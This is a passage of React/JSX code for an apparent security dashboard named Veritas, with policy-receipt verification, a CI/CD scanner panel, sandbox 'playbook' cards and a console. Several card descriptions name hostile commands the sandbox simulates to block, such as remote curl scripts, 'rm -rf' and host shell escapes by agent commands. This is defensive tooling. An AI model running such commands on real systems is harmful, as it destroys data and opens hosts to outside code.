                        <td colSpan={5} style={{ textAlign: 'center', color: 'hsl(var(--text-secondary))', padding: '3rem' }}>
                          No transaction records registered or access unauthorized. Please log in!
                        </td>
                      </tr>
                    )}
                  </tbody>
                </table>
              </div>
            </div>
          </section>
        </div>

        {/* Right Hand Column: Cedar Receipts & Security Findings */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: '2rem' }}>
          
          {/* Cedar Receipts */}
          <section className="glass-panel">
            <div className="card-header">
              <h2 className="card-title">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" style={{ color: 'hsl(var(--info))' }}>
                  <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
                  <path d="M7 11V7a5 5 0 0 1 10 0v4" />
                </svg>
                Verifiable Cedar Policy Receipts
              </h2>
              <span className="status-badge status-completed">Tamper-Proof Ledger</span>
            </div>

            <div className="card-body">
              <div className="receipt-list">
                {receipts.map((rc, idx) => (
                  <div className="receipt-card" key={idx}>
                    <div className="receipt-meta">
                      <span className="receipt-tool">
                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" style={{ color: 'hsl(var(--info))' }}>
                          <path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"/>
                        </svg>
                        Tool: {rc.payload.tool_name}
                      </span>
                      <span className={`status-badge ${rc.payload.decision === 'allow' ? 'status-completed' : 'status-failed'}`}>
                        {rc.payload.decision}
                      </span>
                    </div>
                    <div className="receipt-reason">{rc.payload.reason}</div>
                    <div className="receipt-signature-block">
                      <span className="receipt-digest">policy: {rc.payload.policy_digest.substring(0, 15)}</span>
                      <span className="signature-verified">
                        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
                          <polyline points="20 6 9 17 4 12"/>
                        </svg>
                        ✓ ED25519 VERIFIED
                      </span>
                    </div>
                  </div>
                ))}
                {receipts.length === 0 && (
                  <p style={{ color: 'hsl(var(--text-secondary))', textAlign: 'center', padding: '3rem' }}>
                    No policy receipts logged or access unauthorized.
                  </p>
                )}
              </div>

              {/* Offline Verifier paste box */}
              <div className="verifier-box">
                <h3 className="card-title" style={{ fontSize: '0.92rem' }}>
                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" style={{ color: 'hsl(var(--primary))' }}>
                    <path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z"/>
                  </svg>
                  Offline Cryptographic Receipt Verifier
                </h3>
                <textarea 
                  className="form-control" 
                  placeholder='Paste signed JSON receipt here e.g. {"payload": {...}, "signature": {...}}'
                  value={receiptInput}
                  onChange={e => setReceiptInput(e.target.value)}
                />
                <button className="btn btn-secondary" onClick={handleVerifyReceipt} style={{ width: '100%' }}>
                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                    <path d="M20 11.08V12a8 8 0 1 1-4.8-7.32M22 4 12 14.01l-3-3"/>
                  </svg>
                  Verify Receipt Authenticity
                </button>

                {verificationResult.status !== 'idle' && (
                  <div className={`verification-result result-${verificationResult.status === 'valid' ? 'valid' : 'invalid'}`}>
                    <strong style={{ display: 'flex', alignItems: 'center', gap: '0.4rem' }}>
                      {verificationResult.status === 'valid' ? (
                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
                          <polyline points="20 6 9 17 4 12"/>
                        </svg>
                      ) : (
                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
                          <line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/>
                        </svg>
                      )}
                      {verificationResult.message}
                    </strong>
                    {verificationResult.payload && (
                      <span style={{ fontSize: '0.75rem', marginTop: '0.3rem', fontFamily: 'monospace', color: 'hsl(var(--text-secondary))' }}>
                        Issuer: {verificationResult.payload.issuer_id} <span style={{ color: 'hsl(var(--text-muted))' }}>|</span> Issued: {new Date(verificationResult.payload.issued_at).toLocaleString()}
                      </span>
                    )}
                  </div>
                )}
              </div>
            </div>
          </section>

          {/* Static Scan Findings */}
          <section className="glass-panel">
            <div className="card-header">
              <h2 className="card-title">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" style={{ color: 'hsl(var(--danger))' }}>
                  <path d="m21 21-4.3-4.3"/>
                  <circle cx="11" cy="11" r="8"/>
                  <path d="m8 11 2 2 4-4"/>
                </svg>
                CI/CD Pipeline Static Security Scanner
              </h2>
              <span className="status-badge status-failed">{findings.length} Vulnerabilities</span>
            </div>

            <div className="card-body">
              <div className="findings-container">
                {findings.map((f, idx) => (
                  <div className={`finding-card finding-card-${f.severity.toLowerCase()}`} key={idx}>
                    <div className="finding-header">
                      <span className="finding-title">{f.title}</span>
                      <span className={`status-badge status-${f.severity === 'High' ? 'failed' : f.severity === 'Medium' ? 'flagged' : 'pending'}`}>
                        {f.severity} Severity
                      </span>
                    </div>
                    <div className="finding-body">
                      <div className="finding-meta">
                        <span>File: <strong>{f.file}</strong></span>
                        <span>Step: <strong>{f.step}</strong></span>
                      </div>
                      <p style={{ color: 'hsl(var(--text-secondary))', lineHeight: '1.4' }}>
                        <strong style={{ color: '#fff' }}>Impact:</strong> {f.impact}
                      </p>
                      
                      <div style={{ display: 'flex', flexDirection: 'column', gap: '0.4rem' }}>
                        <span style={{ fontWeight: '700', color: 'hsl(var(--text-secondary))', fontSize: '0.78rem', textTransform: 'uppercase', letterSpacing: '0.03em' }}>Vulnerable Pattern:</span>
                        <pre className="finding-evidence">{f.evidence}</pre>
                      </div>

                      <div className="finding-remediation">
                        <strong>Remediation:</strong> {f.remediation}
                      </div>
                    </div>
                  </div>
                ))}
                {findings.length === 0 && (
                  <div style={{ textAlign: 'center', padding: '3rem' }}>
                    <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" style={{ color: 'hsl(var(--success))', marginBottom: '0.8rem' }}>
                      <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
                      <path d="m9 11 2 2 4-4"/>
                    </svg>
                    <p style={{ color: 'hsl(var(--success))', fontWeight: '700' }}>✓ Pipeline Fully Secure</p>
                    <p style={{ color: 'hsl(var(--text-secondary))', fontSize: '0.82rem', marginTop: '0.4rem' }}>
                      No workflow vulnerabilities detected or access unauthorized.
                    </p>
                  </div>
                )}
              </div>
            </div>
          </section>

        </div>
      </div>

      {/* Interactive Sandbox & Playbooks Grid Section */}
      <div className="terminal-grid-section" style={{ marginTop: '2rem' }}>
        
        {/* Visual Security Playbooks Sidebar */}
        <section className="glass-panel playbooks-panel">
          <div className="card-header">
            <h2 className="card-title">
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" style={{ color: 'hsl(var(--success))' }}>
                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
                <circle cx="12" cy="11" r="3"/>
              </svg>
              Interactive Security Playbooks
            </h2>
            <span className="status-badge status-completed">Shield Active</span>
          </div>
          <div className="card-body" style={{ display: 'flex', flexDirection: 'column', gap: '1rem' }}>
            <p style={{ color: 'hsl(var(--text-secondary))', fontSize: '0.84rem', lineHeight: '1.45', margin: 0 }}>
              Test complex system safeguards in real time with zero coding. Click any card below to launch an automated simulation directly inside our sandbox terminal.
            </p>
            
            <div className="playbook-list">
              
              {/* Playbook 1 */}
              <div 
                className={`playbook-card ${activePlaybook === 'test-pii' ? 'playbook-card-active' : ''}`}
                onClick={() => handlePlaybookClick('test-pii')}
              >
                <div className="playbook-card-header">
                  <div className="playbook-title-block">
                    <div className="playbook-bullet bullet-pii"></div>
                    <span className="playbook-card-title">PII Filtering & Tor Anomaly Shield</span>
                  </div>
                  <span className="playbook-tag tag-pii">Privacy Engine</span>
                </div>
                <p className="playbook-card-desc">
                  Dispatches an anomalous transaction containing Tor credentials and values &gt;$1M. Verifies automated PII email masking and database risk flagging.
                </p>
                <div className="playbook-card-action">
                  <span className="playbook-cmd-preview">veritas-sandbox $ test-pii</span>
                  <button className="playbook-run-button" disabled={activePlaybook !== null}>
                    <span>Trigger</span>
                    <svg width="8" height="8" viewBox="0 0 24 24" fill="currentColor">
                      <polygon points="5 3 19 12 5 21" />
                    </svg>
                  </button>
                </div>
              </div>

              {/* Playbook 2 */}
              <div 
                className={`playbook-card ${activePlaybook === 'test-sandbox' ? 'playbook-card-active' : ''}`}
                onClick={() => handlePlaybookClick('test-sandbox')}
              >
                <div className="playbook-card-header">
                  <div className="playbook-title-block">
                    <div className="playbook-bullet bullet-sandbox"></div>
                    <span className="playbook-card-title">Sandbox Container Jail Lockout</span>
                  </div>
                  <span className="playbook-tag tag-sandbox">MicroVM Jail</span>
                </div>
                <p className="playbook-card-desc">
                  Simulates critical remote curl scripts, directory overrides (rm -rf), and dynamic npm installs inside our gVisor environment to verify total containment blocks.
                </p>
                <div className="playbook-card-action">
                  <span className="playbook-cmd-preview">veritas-sandbox $ test-sandbox</span>
                  <button className="playbook-run-button" disabled={activePlaybook !== null}>
                    <span>Trigger</span>
                    <svg width="8" height="8" viewBox="0 0 24 24" fill="currentColor">
                      <polygon points="5 3 19 12 5 21" />
                    </svg>
                  </button>
                </div>
              </div>

              {/* Playbook 3 */}
              <div 
                className={`playbook-card ${activePlaybook === 'test-receipt' ? 'playbook-card-active' : ''} ${authRole !== 'admin' ? 'playbook-card-locked' : ''}`}
                onClick={() => authRole === 'admin' && handlePlaybookClick('test-receipt')}
                title={authRole !== 'admin' ? "Requires Administrator Authentication" : ""}
              >
                <div className="playbook-card-header">
                  <div className="playbook-title-block">
                    <div className="playbook-bullet bullet-receipt"></div>
                    <span className="playbook-card-title">Cryptographic Receipt Tamper Guard</span>
                  </div>
                  <div style={{ display: 'flex', gap: '0.4rem', alignItems: 'center' }}>
                    <span className="playbook-tag tag-receipt">Ed25519 Cryptography</span>
                    {authRole !== 'admin' && (
                      <span className="lock-badge">
                        <svg width="8" height="8" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3">
                          <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
                          <path d="M7 11V7a5 5 0 0 1 10 0v4" />
                        </svg>
                      </span>
                    )}
                  </div>
                </div>
                <p className="playbook-card-desc">
                  Launches a Docker VM to execute cryptographic signing checks and simulates receipt modifying to trigger instant offline verification alerts.
                </p>
                <div className="playbook-card-action">
                  <span className="playbook-cmd-preview">veritas-sandbox $ test-receipt</span>
                  <button className="playbook-run-button" disabled={activePlaybook !== null || authRole !== 'admin'}>
                    <span>Trigger</span>
                    <svg width="8" height="8" viewBox="0 0 24 24" fill="currentColor">
                      <polygon points="5 3 19 12 5 21" />
                    </svg>
                  </button>
                </div>
              </div>

              {/* Playbook 4 */}
              <div 
                className={`playbook-card ${activePlaybook === 'test-scanner' ? 'playbook-card-active' : ''} ${authRole !== 'admin' ? 'playbook-card-locked' : ''}`}
                onClick={() => authRole === 'admin' && handlePlaybookClick('test-scanner')}
                title={authRole !== 'admin' ? "Requires Administrator Authentication" : ""}
              >
                <div className="playbook-card-header">
                  <div className="playbook-title-block">
                    <div className="playbook-bullet bullet-scanner"></div>
                    <span className="playbook-card-title">CI/CD AST Pipeline Scan Gate</span>
                  </div>
                  <div style={{ display: 'flex', gap: '0.4rem', alignItems: 'center' }}>
                    <span className="playbook-tag tag-scanner">Static Threat Scan</span>
                    {authRole !== 'admin' && (
                      <span className="lock-badge">
                        <svg width="8" height="8" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3">
                          <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
                          <path d="M7 11V7a5 5 0 0 1 10 0v4" />
                        </svg>
                      </span>
                    )}
                  </div>
                </div>
                <p className="playbook-card-desc">
                  Audits our live Actions pipeline YAML files. Instantly parses the Abstract Syntax Tree (AST) to detect and report dynamic prompt-injection vulnerability models.
                </p>
                <div className="playbook-card-action">
                  <span className="playbook-cmd-preview">veritas-sandbox $ test-scanner</span>
                  <button className="playbook-run-button" disabled={activePlaybook !== null || authRole !== 'admin'}>
                    <span>Trigger</span>
                    <svg width="8" height="8" viewBox="0 0 24 24" fill="currentColor">
                      <polygon points="5 3 19 12 5 21" />
                    </svg>
                  </button>
                </div>
              </div>

              {/* Playbook 5 */}
              <div 
                className={`playbook-card ${activePlaybook === 'test-cedar' ? 'playbook-card-active' : ''}`}
                onClick={() => handlePlaybookClick('test-cedar')}
              >
                <div className="playbook-card-header">
                  <div className="playbook-title-block">
                    <div className="playbook-bullet bullet-pii" style={{ background: 'hsl(var(--primary))', boxShadow: '0 0 8px hsl(var(--primary))' }}></div>
                    <span className="playbook-card-title">Cedar Zero-Trust Rule Evaluator</span>
                  </div>
                  <span className="playbook-tag tag-pii" style={{ background: 'hsla(var(--primary), 0.06)', color: 'hsl(var(--primary))', borderColor: 'hsla(var(--primary), 0.15)' }}>Dynamic Cedar AST</span>
                </div>
                <p className="playbook-card-desc">
                  Queries the live access policy engine against simulated agent commands (overwriting files or host shell escapes), evaluating active rules in policy.cedar.
                </p>
                <div className="playbook-card-action">
                  <span className="playbook-cmd-preview">veritas-sandbox $ test-cedar</span>
                  <button className="playbook-run-button" disabled={activePlaybook !== null}>
                    <span>Trigger</span>
                    <svg width="8" height="8" viewBox="0 0 24 24" fill="currentColor">
                      <polygon points="5 3 19 12 5 21" />
                    </svg>
                  </button>
                </div>
              </div>

              {/* Playbook 6 */}
              <div 
                className={`playbook-card ${activePlaybook === 'test-alerts' ? 'playbook-card-active' : ''} ${authRole !== 'admin' ? 'playbook-card-locked' : ''}`}
                onClick={() => authRole === 'admin' && handlePlaybookClick('test-alerts')}
                title={authRole !== 'admin' ? "Requires Administrator Authentication" : ""}
              >
                <div className="playbook-card-header">
                  <div className="playbook-title-block">
                    <div className="playbook-bullet bullet-sandbox" style={{ background: 'hsl(var(--info))', boxShadow: '0 0 8px hsl(var(--info))' }}></div>
                    <span className="playbook-card-title">Incident Alerting & Webhook Gateway</span>
                  </div>
                  <div style={{ display: 'flex', gap: '0.4rem', alignItems: 'center' }}>
                    <span className="playbook-tag tag-sandbox" style={{ background: 'hsla(var(--info), 0.06)', color: 'hsl(var(--info))', borderColor: 'hsla(var(--info), 0.15)' }}>Slack Webhooks</span>
                    {authRole !== 'admin' && (
                      <span className="lock-badge">
                        <svg width="8" height="8" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3">
                          <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
                          <path d="M7 11V7a5 5 0 0 1 10 0v4" />
                        </svg>
                      </span>
                    )}
                  </div>
                </div>
                <p className="playbook-card-desc">
                  Simulates dynamic tool call violations to generate a security event, validating that Slack operational alert dispatches format rich visual details properly.
                </p>
                <div className="playbook-card-action">
                  <span className="playbook-cmd-preview">veritas-sandbox $ test-alerts</span>
                  <button className="playbook-run-button" disabled={activePlaybook !== null || authRole !== 'admin'}>
                    <span>Trigger</span>
                    <svg width="8" height="8" viewBox="0 0 24 24" fill="currentColor">
                      <polygon points="5 3 19 12 5 21" />
                    </svg>
                  </button>
                </div>
              </div>

            </div>
          </div>
        </section>

        {/* Embedded Secure Console Shell */}
        <section className="glass-panel terminal-window" style={{ marginTop: 0 }}>
          <div className="terminal-header">
            <div className="terminal-dots">
              <span className="terminal-dot dot-red"></span>
              <span className="terminal-dot dot-yellow"></span>
              <span className="terminal-dot dot-green"></span>
            </div>
            <span className="terminal-title">Veritas Secure VM Sandbox Shell</span>
            <span className="terminal-badge">
              {activePlaybook ? 'RUNNING SIMULATION' : 'LIVE VM ACTIVE'}
            </span>
          </div>
          
          <div className="console-box">
            {consoleLines.map((line, idx) => {
              let color = '#d1d5db';
              if (line.startsWith('❌') || line.includes('SECURITY ERROR') || line.includes('failed')) {
                color = 'hsl(var(--danger))';
              } else if (line.startsWith('veritas-sandbox $') || line.includes('veritas-sandbox $')) {
                color = '#ffaa00';
              } else if (line.startsWith('✅') || line.includes('Successfully') || line.includes('✓') || line.includes('ONLINE')) {
                color = 'hsl(var(--success))';
              } else if (line.startsWith('⚙️') || line.startsWith('🛡️') || line.startsWith('📡') || line.startsWith('🚀') || line.includes('[SANDBOX]')) {
                color = 'hsl(var(--info))';
              }
              return (
                <div className="console-line" key={idx} style={{ color }}>
                  {line}
                </div>
              );
            })}
            <div ref={consoleEndRef} />
          </div>
          
          <form onSubmit={handleConsoleSubmit} className="console-input">
            <span className="console-prompt">veritas-sandbox $</span>
            <input 
              type="text" 
              className="console-field" 
              placeholder={activePlaybook ? 'Running simulation...' : 'Type "help" to view allowed workspace playbooks...'}
              value={consoleInput}
              onChange={e => setConsoleInput(e.target.value)}
              disabled={activePlaybook !== null}
            />
          </form>
        </section>
      </div>

    </div>
  );
}
